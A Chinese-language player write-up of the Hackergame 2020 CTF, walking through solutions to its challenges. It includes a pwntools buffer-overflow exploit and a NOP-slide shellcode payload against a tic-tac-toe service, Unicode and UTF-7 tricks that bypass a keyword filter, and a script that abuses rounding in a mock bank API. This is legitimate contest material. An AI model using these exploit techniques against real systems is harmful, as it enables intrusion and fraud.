# Hackergame 2020 Write-up

## 写在前面

作为一个已经打了两年Hackergame的新手玩家，这次终于不是只签个到就走了，肝了好几天最后勉强留在了榜上，在这里记录一下解题过程和想法。

## 0x00 签到

嗯，很简单，只是这个控件稍微有点反人类，也许手稳一点就能过（

![](https://storage.krrr.party/storage/klog2/签到1.17f1517be4f0dd1cb432cacb20eb1fa7.png)

然后F12发现JS里甚至还写了在1附近横跳的逻辑……

```html
<script type="text/javascript">
            var prevVal = 0;
            $(document).ready(function() {
                $("#show").text($('#number')[0].value);
                $('#number').on('input', function() {
                    if ($('#number')[0].value.toString() === "1") {
                        console.log('没想到吧!');
                        $('#number')[0].value = 1.00001;
                        if (prevVal == 1.00001)  $('#number')[0].value = 0.99999;
                        if (prevVal == 0.99999)  $('#number')[0].value = 1.00001;
                    }
                    $("#show").text($('#number')[0].value.toString());
                    prevVal = $('#number')[0].value;
            });
        });
        </script>
```

改input元素的值好了。

![](https://storage.krrr.party/storage/klog2/image-20201108110103875.442b2e7a93a7c94a20f57443ba1b800c.png)

![](https://storage.krrr.party/storage/klog2/image-20201108110514464.9e1118612522ba3e118ecedcc0b7af17.png)

## 0x01 猫咪问答++

**第一题**

Google一下->看一眼标志->估计一下是不是哺乳动物->嗯，12个。

**第二题**

搜出来这个：[以鸟类为载体的网际协议](https://zh.wikipedia.org/wiki/%E4%BB%A5%E9%B8%9F%E7%B1%BB%E4%B8%BA%E8%BD%BD%E4%BD%93%E7%9A%84%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AE)……噗，再根据[RFC1149](https://tools.ietf.org/html/rfc1149)可知MTU为256 milligrams。

**第三题**

[2019 软件自由日中国科大站](https://news.ustclug.org/2019/09/2019-sfd-ustc/)，Teeworlds，9。

**第四题**

从[百度的卫星地图](https://map.baidu.com/search/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%A4%A7%E5%AD%A6%E8%A5%BF%E6%A0%A1%E5%8C%BA%E5%9B%BE%E4%B9%A6%E9%A6%86/@13053885.10214869,3720245.127025567,19.87z/maptype%3DB_EARTH_MAP)里看不清……然后根据提示看[街景地图](https://map.baidu.com/search/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%A4%A7%E5%AD%A6%E8%A5%BF%E6%A0%A1%E5%8C%BA%E5%9B%BE%E4%B9%A6%E9%A6%86/@13053819.58,3720218.68,21z,87t,-84.8h#panoid=09010500121705221534309496D&panotype=street&heading=338.4&pitch=-10.26&l=21&tn=B_NORMAL_MAP&sc=0&newmap=1&shareurl=1&pid=09010500121705221534309496D)，9。

**第五题**

[Hackergame 2019新闻稿](https://news.ustclug.org/2019/12/hackergame-2019/)，17098。

![](https://storage.krrr.party/storage/klog2/image-20201108132111091.7263ae95711f4b13666aec1f12ba3b7c.png)

其实有几个题不确定的话也可以爆破的吧（

## 0x02 2048

![](https://storage.krrr.party/storage/klog2/image-20201108132306207.96929620cad57790779b8db64e9493de.png)
F12看到一句注释：

```html
<!-- 
    changelog:
    - 2020/10/31 getflxg @ static/js/html_actuator.js
  -->
```

继续看`html_actuator.js`，这也太难了（

```javascript
var text = new Array();
  text[1] = "红专并进"
  text[2] = "理实交融"
  text[3] = "永恒东风"
  text[4] = "红过九重"
  text[5] = "科学高峰"
  text[6] = "高到无穷"
  text[7] = "某坑势力"
  text[8] = "信息安全"
  text[9] = "炸毁金矿"
  text[10] = "火山喷发"  
  text[11] = "也西东流"  
  text[12] = "直通云霄"
  text[13] = "太空校区"
  text[14] = "大成功"
```

再往下拉，看到大成功之后给flag的url。

```javascript
if (won) {
    url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
  } else {
    url = "/getflxg?my_favorite_fruit=";
  }
```

console运行一下…NaN还行（

![](https://storage.krrr.party/storage/klog2/image-20201108132927634.2a06ee15174e89bfc739ce3da3f9e948.png)

![](https://storage.krrr.party/storage/klog2/image-20201108133016884.e14a52368359e765ac54bd685d81b6b0.png)

## 0x03 一闪而过的 Flag

CLI运行一下秒了。

```
> .\Untitled01.exe
flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}
```

## 0x04 从零开始的记账工具人

| 单价           | 数量 |
| :------------- | :--: |
| 伍元玖角叁分   |  8   |
| 拾叁元肆角贰分 |  1   |
| 贰元陆角玖分   |  5   |
| 拾捌元柒角叁分 |  1   |
| ...            | ...  |

Excel只有阿拉伯数字转中文大写但没有转回去的功能……xlsx转csv，然后抄一个Python的转换函数，累加就行了。

```python
acc = 0
with open('bills.csv', 'r', encoding='utf-8') as bills:
    for line in bills.readlines():
        if line != '':
            nc, na = line[:-1].split(',')
            acc += convert_cndigit(nc)*int(na)
print(f'flag{{{acc:.2f}}}')  # flag{17365.37}
```

## 0x05 超简单的世界模拟器

在[Game of Life的wiki](https://www.conwaylife.com/wiki/Main_Page)上找到了沿着orthogonal或diagonal方向运动的spaceship，但因为能改变的区域只有左上角，怎么都够不到下面那个正方形的稳定点。

![constructive](https://storage.krrr.party/storage/klog2/constructive.bce6efbd08131b1327962b1d6a3ab407.gif)

构造的方法只能得到一个flag，怒了，放了几天之后又看了一下题目里的漫画——无限的时间和空间，宇宙的本质，00101010，混沌，随机……

[无限猴子定理](https://en.wikipedia.org/wiki/Infinite_monkey_theorem)！考虑以随机的bit来初始化这15x15的区域，一定能够碰到在演化200代之后正好摧毁两个方块的模式。（将信将疑地改了一个Game of Life的Python代码来跑：

```python
import numpy as np


class GameOfLife:
    def __init__(self):
        # world with padding
        self.world_shape = (52, 52)
        self.world = np.zeros(self.world_shape, dtype=int)
        # set target to destroy
        self.targets = [(6, 46), (6, 47), (7, 46), (7, 47),
                        (26, 46), (26, 47), (27, 46), (27, 47)]
        for pos in self.targets:
            self.world[pos] = 1
        # generate ramdom pattern
        self.pattern = np.random.randint(2, size=(15, 15))
        self.world[1:16, 1:16] = self.pattern

    def update(self):
        world = self.world
        new_world = np.zeros(self.world_shape, dtype=int)
        for i in range(1, self.world_shape[0] - 1):
            for j in range(1, self.world_shape[1] - 1):
                neighbors = world[i-1:i+2, j-1:j+2].sum() - world[i, j]
                if world[i, j] == 1 and neighbors in (2, 3):
                    new_world[i, j] = 1
                elif world[i, j] == 0 and neighbors == 3:
                    new_world[i, j] = 1
                else:
                    new_world[i, j] = 0
        self.world = new_world

    def update_and_plot(self, n_iter):
        for _ in range(n_iter):
            self.update()
            with open('status.txt', 'w') as f:
                for row in self.world:
                    for elem in row:
                        f.write(str(elem))
                    f.write('\n')

    def check(self):
        acc = 0
        for pos in self.targets:
            acc += self.world[pos]
        return acc == 0


if __name__ == '__main__':
    while True:
        world = GameOfLife()
        world.update_and_plot(201)
        if world.check():
            break
    for row in world.pattern:
        for elem in row:
            print(elem, end='')
        print()
```

看着随机的世界不断演化，有一丝造物主的感觉。（结果运气蛮好，几分钟就跑出来了：

![essence](https://storage.krrr.party/storage/klog2/essence.bdd0ec17ee8193eb4606261a98a41df6.gif)

## 0x06 自复读的复读机

### 反向复读

Google只找到了Python 2版本的[reverse quine](https://codegolf.stackexchange.com/a/16057)（Stack Exchange的Code Golf板块还挺逗的），改成Python 3：

```python
_='(]1-::[_%%_)tnirp;%r=_';print(_%_[::-1])
```

但是`print`出来的字符串会带个`\n`，加个`end=''`的参数貌似又会跟引号冲突……直接用`sys.stdout.write`好了：

```python
_=')]1-::[_%%_(etirw.tuodts.)"sys"(__tropmi__;%r=_';__import__("sys").stdout.write(_%_[::-1])
```

![](https://storage.krrr.party/storage/klog2/image-20201108150348112.07e27859bd2751e09aaf394c5015096f.png)

### 哈希复读

跟quine差不多，用`hashlib`算个SHA256就是了：

```python
_='_=%r;import hashlib;import sys;sys.stdout.write(hashlib.sha256((_%%_).encode()).hexdigest())';import hashlib;import sys;sys.stdout.write(hashlib.sha256((_%_).encode()).hexdigest())
```

![](https://storage.krrr.party/storage/klog2/image-20201108175024509.484ed48673a6dd2c9f78f9fe0e054411.png)

不想再玩Code Golf了（

## 0x07 233 同学的字符串工具

### 绕过to_upper()

```python
def to_upper(s):
    r = re.compile('[fF][lL][aA][gG]')
    if r.match(s):
        print('how dare you')
    elif s.upper() == 'FLAG':
        print('yes, I will give you the flag')
        print(open('/flag1').read())
    else:
        print('%s' % s.upper())
```

以关键字"python upper exploit"搜出来这篇文章[The Fall Of Mighty Django, Exploiting Unicode Case Transformations](https://0xsha.io/posts/the-fall-of-mighty-django-exploiting-unicode-case-transformations)，发现一种“fl”的[ligature](https://en.wikipedia.org/wiki/Orthographic_ligature) “ﬂ”（Unicode 0xFB02），在Python的`str.upper()`作用下会变成“FL”，于是：

![](https://storage.krrr.party/storage/klog2/image-20201108152150551.456ff4d93faecb53ae1e410e0d916163.png)

### 绕过to_utf8()

```python
def to_utf8(s):
    r = re.compile('[fF][lL][aA][gG]')
    s = s.encode() # make it bytes
    if r.match(s.decode()):
        print('how dare you')
    elif s.decode('utf-7') == 'flag':
        print('yes, I will give you the flag')
        print(open('/flag2').read())
    else:
        print('%s' % s.decode('utf-7'))
```

参考[UTF-7](https://zh.wikipedia.org/wiki/UTF-7)，根据其编码规则，ASCII字符能表示的符号其实也可以再被ASCII字符编码一次，比如`a`->`0 0 6 1`->`000000 000110 000100`->`0 6 4`->`A G E`->`+AGE-`。

![](https://storage.krrr.party/storage/klog2/image-20201108153707214.ebdb67b96dfb79006d89e30490aaa5ec.png)

![](https://storage.krrr.party/storage/klog2/image-20201108154122027.f2c641d740fcc3abbd67136d8096a37f.png)

这篇[utf8everywhere](www.utf8everywhere.org)值得一读（

## 0x08 233 同学的 Docker

Dockerfile的每次`RUN`都会产生一个新的layer，删除的文件应该在这个image的某个layer里，pull下来直接搜就好了。

![](https://storage.krrr.party/storage/klog2/image-20201108155805041.44ee1510c12ffbaf6162a53b9fb7a9bb.png)

## 0x09 从零开始的 HTTP 链接

浏览器和curl都不支持TCP的0端口，wget倒是可以，不过只能下载个静态网页，可以看到html里面有个WebSocket实现的terminal。通过Socket编程来跟这个terminal交互有点困难，直接糊一个TCP proxy出来好了：

```python
import sys
import socket
import threading


def recv_data(connection):
    connection.settimeout(5)
    buffer = b''
    try:
        while True:
            data = connection.recv(4096)
            if not data:
                break
            buffer += data
    except:
        pass
    return buffer


def proxy_handler(local_socket, remote_socket):
    while True:
        local_buffer = recv_data(local_socket)
        if local_buffer:
            remote_socket.send(local_buffer)
        remote_buffer = recv_data(remote_socket)
        if remote_buffer:
            local_socket.send(remote_buffer)
        if not local_buffer or not remote_buffer:
            local_socket.close()
            remote_socket.close()
            break


if __name__ == '__main__':
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('localhost', 8080))
    server.listen(5)
    try:
        while True:
            local_socket, addr = server.accept()
            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_socket.connect(('202.38.93.111', 0))
            proxy_thread = threading.Thread(
                target=proxy_handler, args=(local_socket, remote_socket)
            )
            proxy_thread.start()
    finally:
        server.close()
```

最后浏览器访问：`localhost:8080`，然后在terminal里输入token即可得到flag：flag{TCP_P0RT_0_1s_re5erved_BUT_w0rks_*}

## 0x0a 来自一教的图片

题里的傅里叶光学，文件名4f_system_middle.bmp，暗示很明确了，这是个4f系统的中间平面（频谱平面），再来一次透镜成像可以在像平面得到倒像。

![](https://storage.krrr.party/storage/klog2/4F_Correlator.78aed9e77d68f4ba86dc7ec733ac64b2.jpg)

变换大概是这样：$$F(u,v)\text{:=}\int _{-\infty }^{\infty }\int _{-\infty }^{\infty }f(x,y) e^{-2 \pi  i (u x+v y)}dxdy$$

在Mathematica里把图片导入为600x600的bit矩阵，然后把手写的二维离散傅里叶变换map上去：

![](https://storage.krrr.party/storage/klog2/image-20201108185724289.e0f9a2c03dff6d63788291f71e60ce8a.png)

太慢了……试试它自带函数的好了，不知道会用什么算法（魔法）。

![](https://storage.krrr.party/storage/klog2/image-20201108160651698.eae480b632f376d3cfc72c0c64e911c5.png)

## 0x0b 超简陋的 OpenGL 小程序

给了这样一个文件夹：

```
glHackergame
├── basic_lighting.fs
├── basic_lighting.vs
├── data.bin
└── glHackergame.exe
```

直接运行一下exe试试：

![](https://storage.krrr.party/storage/klog2/20201109011826.fd3a46c1ee87d50d677c70fc89e32825.png)

猜测给的.fs和.vs程序可以改什么参数，而hexdump看不出.bin和.exe藏了东西，或者有什么其他的反编译的方法能把模型弄出来…又该复习OpenGL了：[你好，三角形](https://learnopengl-cn.readthedocs.io/zh/latest/01%20Getting%20started/04%20Hello%20Triangle/)。

![](https://storage.krrr.party/storage/klog2/pipeline.1e286dd517c717e3f1c48792275f7e87.png)

前两个代码貌似跟这篇[光照基础](https://learnopengl-cn.readthedocs.io/zh/latest/02%20Lighting/02%20Basic%20Lighting/)里的*vertex shader*和*fragment shader*一模一样，在上面的光栅化渲染管线的示意图里可以看到，前者将三维的顶点坐标变换到二维的屏幕空间坐标，后者则负责环境颜色和光照的计算。

当然了，理论也要跟胡搞相结合，在某一次尝试修改.vs里的`aPos`的`z`分量为0之后可以隐隐约约地看见flag：

![](https://storage.krrr.party/storage/klog2/20201109181605.ecaea8e9ad530daf03e1084f96ba1f29.png)

而修改`x`分量为-0.2时模型会变成两条线：

![](https://storage.krrr.party/storage/klog2/20201109181539.89fc342a72d7a58a6533c9f56ce20258.png)

前者让我想起了模型渲染中的[Z-fighting](https://en.wikipedia.org/wiki/Z-fighting)现象，我猜测这样改会把所有顶点的z轴分量都置为0，于是flag和前面的墙被挤在了一起；而后者则是由于x轴的分量为-0.2，前面的墙和后面的flag都被压缩到了x=-0.2的y-z平面上，也印证了猜测。

于是为了看见flag，考虑能否在vertex shader里把墙后面的顶点的z分量调到墙的前面来，`if`也不写了，直接把z轴反转试试：

```c
// basic_lighting.vs
// FragPos = vec3(model * vec4(aPos, 1.0));
vec3 pos = aPos;
pos.z = -pos.z;
FragPos = vec3(model * vec4(pos, 1.0));
```

再在fragment shader里把漫反射的光源改到前面来，不然看不清字：

```c
// basic_lighting.fs
// vec3 lightDir = normalize(lightPos - FragPos);
vec3 lightDir = normalize(vec3(0.0f, 0.0f, -10.0f) - FragPos);
```

![](https://storage.krrr.party/storage/klog2/20201109011751.9dec6825e68c567942af1c4f9729b117.png)

## 0x0c 生活在博弈树上

文章写得还行，给个满分好了。

题目打开之后是个井字棋，AI每次都会先手下在左上角的格子，在尝试了各种走法之后我确信后手是赢不了的——对手方落一子，我便认输。

![](https://storage.krrr.party/storage/klog2/20201109184506.e1222907016cebb1b5d5e812835da9b6.png)

打开给的源代码看看，发现在`void ai(int *x, int *y)`下面有两行注释：

```c
// Make sure that human cannot win
// I heard that there's an algorithm named "Minimax"
```

好家伙，含有Alpha-beta剪枝的极大化极小算法，不愧是生活在博弈树上…接着读`main`函数：

```c
bool success = false;  // human wins?
char input[128] = {};  // input is large and it will be ok.
```

明示这个`input`数组有buffer overflow的漏洞了。

```c
while (!success) {
    while (true) {
        printf("Your turn. Input like (x,y), such as (0,1): ");
        gets(input);
        ...
    }
    ...
}
if (success) {
    puts("What? You win! Here is your flag:");
    flag_decode();
    puts(flag);
}
```

只要让输入溢出`input`，然后把`success`覆盖为`true`我就赢了，不多说了，反编译：

```shell
objdump -d tictactoe > tictactoe.s
```

找到初始化`success`和`input`的那两行指令：

```assem
00000000004022f4 <main>:
...
  40233b:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
  40233f:	48 8d 95 70 ff ff ff 	lea    -0x90(%rbp),%rdx
...
```

嗯，`success`在RBP寄存器的下面1个字节，`input`从RBP下面0x90个字节开始，构造`payload`为正常输入的落子点(0,1)+填充+true的值：

```python
from pwn import remote

def always_love_the_ground():
    payload = b'(0,1)' + b'#'*(0x90-0x6) + b'\x01'
    game = remote('202.38.93.111', 10141)
    game.recvuntil('Please input your token: ')
    game.sendline(token)
    game.recvuntil('Your turn. Input like (x,y), such as (0,1): ')
    game.sendline(payload)
   
if __name__ == '__main__':
    always_love_the_ground()
```

拿到了一个flag，始终热爱大地！

```shell
[+] Opening connection to 202.38.93.111 on port 10141: Done
[*] Switching to interactive mode
You wanna put X on (0,1)...
OX_
___
___
What? You win! Here is your flag:
flag{easy_gamE_but_can_u_get_my_shel1}
```

然后flag还提示了可以拿shell，只会[NOP slide](https://en.wikipedia.org/wiki/NOP_slide)的我决定继续升上天空，算了算偏移量，然后写出这样的payload，可以覆盖(EBP+0x8)处的返回地址，跳转到NOP再滑向shellcode：

```python
b'(0,1)' + b'\x90'*(0x90-0x6-len(shellcode)) + shellcode + b'\x01' + b'\x90'*8 + b'\xd8\xdd\xff\xff\xff\x7f\x00\x00'
```

SEGMENTATION FAULT，大概是编译的时候有stack protector…败了。

```shell
Program received signal SIGSEGV, Segmentation fault.
```

## 0x0d 狗狗银行

> 你能在狗狗银行成功薅到羊毛吗？

![](https://storage.krrr.party/storage/klog2/20201109193831.50410e5d67e727dfcaadd12979646802.png)

初始储蓄卡里1000 doge_coin（之后省略单位了吧），日利率0.3%，显然不够吃饭；而信用卡日利率0.5%，借了钱每天最低也要交10，惨。

![](https://storage.krrr.party/storage/klog2/20201109193854.344cc2853e8c91c8972a61403181ec13.png)

后来的公告还提示了后端为大整数计算，排除了欠款溢出的操作，还设了1000张卡的上限，估计是要办很多卡来薅羊毛。

在尝试之后发现利息会有舍入，存款为167的储蓄卡理论上每日利息为0.501，实际计为1，而欠款为2099的信用卡利息为10.495，实际还是会变为10；于是可以用储蓄卡来套利，极限操作的实际利率为1/167=0.5988%，够还信用卡的利息+吃饭了。

编写自动化脚本来完成所有的操作：

```python
import requests
import json

url = 'http://202.38.93.111:10100'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
    'Authorization': 'DETACHED'
}


def create(card_type):
    '''credit/debit'''
    url_create = url + '/api/create'
    payload = {'type': card_type}
    requests.post(url_create, headers=headers, json=payload)


def transfer(src, dst, amount):
    url_transfer = url + '/api/transfer'
    payload = {'src': src, 'dst': dst, 'amount': amount}
    requests.post(url_transfer, headers=headers, json=payload)


def eat(card_id):
    url_eat = url + '/api/eat'
    payload = {'account': card_id}
    requests.post(url_eat, headers=headers, json=payload)


# 办20张信用卡(2-21)
for _ in range(20):
    create('credit')
# 办250张储蓄卡(22-271)
for _ in range(250):
    create('debit')
    
# 所有信用卡各借2099转到储蓄卡1
for credit in range(2, 22):
    transfer(credit, 1, 2099)
# 储蓄卡1向其余的储蓄卡各转167
for debit in range(22, 272):
    transfer(1, debit, 167)
eat(1)

# 把信用卡的欠款维持在2099，储蓄卡的余额维持在167，再过23天就行了
for _ in range(23):
    for credit in range(22, 272):
        transfer(credit, 1, 1)
    for debit in range(2, 22, 1):
        transfer(1, debit, 10)
    eat(1)
```

挂着脚本，每次刷新网页都会发现自己的净资产在涨，突然体会到了当资本家的感觉（

![](https://storage.krrr.party/storage/klog2/20201109193743.6ead3f68b9da25f53ba53bfee92fdc26.png)

## 0x0e 超基础的数理模拟器

不就是400道定积分，我直接积不出来…让*数理基础*扎实的Mathematica来做吧。

![](https://storage.krrr.party/storage/klog2/20201109221643.1c1fcc1955b309912c5e3289329ca592.png)

从网页的html里可以直接找到LaTeX格式的式子，不过在丢给Mathematica解析之前还需要做一些预处理，比如要用括号把被积表达式括起来，改一下$e$和$dx$的写法。

```python
def tex_to_wolfram(tex):
    tex_escape = tex.replace(
        r' ', r' \left( ', 1).replace(
        r'\,{d x}', r' \right) \, dx').replace(
        '\\', '\\\\')
    tex_escape = re.sub(r'\be', ' E', tex_escape)
    wolfram = f'NumberForm[ToExpression["{tex_escape}", TeXForm, Hold] /. Integrate -> NIntegrate // ReleaseHold, {{10, 6}}]'
    return wolfram
```

接着通过`subprocess`来调用Wolfram Engine，用CLI的标准I/O来输入题目和输出答案，如果Mathematica吐出来奇怪的东西就把这题pass了吧。

```python
def solve_question(tex_expr):
    print(f'Expression: {tex_expr}')
    wolfram_expr = tex_to_wolfram(tex_expr)
    wolfram = subprocess.Popen(
        "wolfram", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    wolfram.stdin.write(wolfram_expr.encode())
    wolfram.stdin.close()
    out = wolfram.stdout.read().decode()
    wolfram.stdout.close()
    ans = re.search(r'Out\[1\].*', out).group()[20:-1]
    if re.match(r'^[-+]?[0-9]+\.[0-9]+$', ans):
        print(f'Answer: {ans}\n')
        return ans
    else:
        print('*PASS*\n')
        return None
```

再写一下GET问题和POST答案的操作，然后发现了每次刷新页面都会有Set-Cookie的操作，并且cookie中会记录做题的进度，于是每次做完题之后都会存一下cookie，避免丢失进度。

```python
def get_cookie():
    with open('cookie.txt', 'r') as cookie_file:
        cookie = cookie_file.read()
    return cookie

def set_cookie(cookie):
    with open('cookie.txt', 'w') as cookie_file:
        cookie_file.write(cookie)

def get_question():
    url = 'http://202.38.93.111:10190'
    headers = {'Cookie': get_cookie()}
    response = requests.get(url, headers=headers)
    cookie_new = response.headers['Set-Cookie'][:-18]
    set_cookie(cookie_new)
    tex_expr = re.search(
        r'<p> \$.*\$</p>', response.text
    ).group()[5:-5]
    n_todo = re.search(
        r'<h1 class="cover-heading">.*</h1>', response.text
    ).group()[27:-7]
    return tex_expr, cookie_new, int(n_todo)

def get_question_file():
    with open('tex_expr.txt', 'r') as f:
        tex_expr = f.read()
    return tex_expr

def post_answer(ans, cookie):
    url = 'http://202.38.93.111:10190/submit'
    headers = {'Cookie': cookie}
    payload = {'ans': ans}
    response = requests.post(url, headers=headers, data=payload)
    cookie_new = response.headers['Set-Cookie'][:-18]
    set_cookie(cookie_new)
```

最后就是循环刷题了，不过在最后一题的时候停下让我来手动POST答案，这样可以处理最后flag页面的解析异常~~，也能有点仪式感~~。

```python
def main():
    while True:
        try:
            tex_expr, cookie, n_todo = get_question()
            if n_todo == 1:
                break
            print(f'Progress: {400-n_todo}/400')
            ans = solve_question(tex_expr)
            if ans:
                post_answer(ans, cookie)
        except:
            continue

if __name__ == '__main__':
    main()
    # solve_question(get_question_file())
```

跑！

![](https://storage.krrr.party/storage/klog2/20201109222735.c4bf6163416ae976ee024140e4c02bc5.png)

终于。

![](https://storage.krrr.party/storage/klog2/20201109222853.069ebd0f06f38328c77b91bc96d59302.png)

好，数理基础很扎实。

![](https://storage.krrr.party/storage/klog2/20201109223023.24a1da54731e85ce98fba81e16e58f8b.png)

写这题的时候debug的时间蛮长的，这套pipeline一开始跑起来的速度还很慢，我甚至加了一句题目的LaTeX表达式长度大于180时pass，还想写个30秒timeout然后pass的装饰器，再开8个子进程来刷新页面得到不同的题目然后并行求解，哪个先解出来就kill其他进程，并且用它的cookie接着算，甚至有种在区块链上挖矿的感觉，又像是做题家们在内卷……

后来在Mathematica语句里用NIntegrate[]替换了N[Integrate[]]的写法，前者直接计算表达式的近似数值解，而后者在大部分情况下会先计算表达式的解析解再取近似值，于是慢得离谱而且不一定能得出解析解。

于是在我还没构思好进程池怎么调度的时候题就刷完了。

## 0x0f 不经意传输

> 某同学在某不知名百科网站上看到一个神奇的密码学协议，叫做「不经意传输」（Oblivious transfer）。
>
> 于是他按照网站上描述的「1–2 oblivious transfer」自己实现了协议中一方的逻辑，你可以作为另一方与之进行交互。
>
> 完全按照百科网站上的算法来实现的协议应该不会有什么问题吧？

根据[Oblivious transfer wiki](https://en.wikipedia.org/wiki/Oblivious_transfer)的描述，这个协议首先假设Alice有两条秘密消息$m_0$和$m_1$，然后Bob可以通过$b \in \left\{0,1\right\}$来选择接收某一条消息，而Bob的选择对Alice来说是保密的，所以这种协议大概可以用来……抽牌？

![](https://storage.krrr.party/storage/klog2/20201109210004.e9d6f67443f1605558814d68e61c118b.png)

题目给的代码照搬了上图所示的基于RSA的Oblivious transfer协议，服务器作为Alice，而我作为Bob来与服务器交互完成传输的过程，最后根据如下的代码，最后需要给出$m_0$和$m_1$的猜测。

```python
guess0 = int(input("m0 = "))
guess1 = int(input("m1 = "))
if guess0 == m0:
    print(open("flag1").read())
    if guess1 == m1:
        print(open("flag2").read())
else:
    print("Nope")
```

假设我选择接收$m_0$，与服务器交互的过程如下：

![](https://storage.krrr.party/storage/klog2/20201109214019.8e13e2f1513d69e5d20848c42acdc40c.png)

而得到另一条消息$m_1$需要知道$k_1$的值，而$k_1 =(v-x_1)^d$，其中$v$和$x_1$已知，求$k_1$等于求有限域上的离散对数，也就是攻破RSA，该搞台量子计算机了（这题应该有其他实现上的问题，还是想不到。

## 后记

相比于前两年，这次我终于有时间来玩个爽了，知晓了些有用的没用的知识，再感叹USTC的nerd真会玩（

题都是靠着搜索、爆破和一点点数理基础做的，面对传统Web、Reverse和Crypto的题依旧一脸茫然，只能膜前面真正数理和安全基础扎实的dalao了。